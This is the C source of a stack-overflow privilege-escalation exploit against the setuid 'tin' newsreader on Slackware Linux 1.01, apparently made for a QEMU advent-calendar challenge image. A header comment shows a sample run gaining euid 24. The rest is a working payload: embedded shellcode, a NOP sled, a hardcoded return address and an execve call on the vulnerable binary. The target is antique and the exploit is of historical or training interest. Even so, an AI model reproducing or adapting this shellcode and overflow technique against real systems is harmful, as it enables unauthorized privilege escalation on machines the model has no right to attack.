/*
 Slackware Linux 1.01 "tin" stack overflow privilege escalation
 ==============================================================
 Privilege escalation exploit for Slackware Linux 1.01 part of
 the QEMU 2014 advent calendar pack. Stack based overflow exists
 in the setuid binary "tin" which can be exploited to gain uid 24
 privileges from a local user perspective.

 e.g.
 slack:/tmp$ id
 uid=404(ftp) gid=1(other)
 slack:/tmp$ uname -a
 Linux slack 0.99.12 #6 Sun Aug 8 16:02:35 CDT 1993 i586
 slack:/tmp$ ls -al /usr/bin/tin
 -rwsr-sr-x   2 24       24         185348 Feb 14  1993 /usr/bin/tin
 slack:/tmp$ gcc prdelka-vs-GNU-tin.c -o prdelka-vs-GNU-tin
 slack:/tmp$ ./prdelka-vs-GNU-tin
 [ Slackware linux 1.01 /usr/bin/tin priv-esc exploit
 tin 1.1 PL8 (c) Copyright 1991-92 Iain Lea.
 Reading news active file...
 Reading attributes file...s...
 Reading newsgroups file...
 Matching jX1j[Í%^1É±>|.1Û1ҳ²ÿfB*f)ڈFâèÿÿÿ8Woihzooipu6o6666ǐWéZÔ±ÿ¿ groups...Matching jX1j[Í%^1É±>|.1Û1ҳ²ÿfB*f)ڈFâèÿÿÿ8Woihzooipu6o6666ǐWéZÔ groups...$ 
 $ id
 uid=404(ftp) gid=1(other) euid=24

 -- prdelka

*/
#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\x6a\x17\x58\x31\xdb\x6a\x18\x5b\xcd\x80\x90"
		 "\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c"
		 "\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3"
		 "\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88"
		 "\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff"
		 "\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70"
	         "\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90"
		 "\xe9\x5a\x90\xe8\xb7\x12\xd4\x87";


int main(int argc,char* argv[]){
	char *env[] = {NULL};
	char *buffer = malloc(2048);
	char *ptr;
	char *argp[] = {"/usr/bin/tin",buffer,shellcode,NULL};
	if(!buffer){
		printf("[ malloc() failure\n");	
		exit(-1);	
	}
	printf("[ Slackware linux 1.01 /usr/bin/tin priv-esc exploit\n");
	memset(buffer,0,2048);
	memset(buffer,'\x90',1019);
	(long)ptr = (long)buffer + 1019;
	memcpy(ptr,"\xb1\xfb\xff\xbf",4);
	(long)ptr = (long)ptr - 600;
	memcpy(ptr,shellcode,strlen(shellcode));	
	execve("/usr/bin/tin",argp,env);	
	exit(0);
}

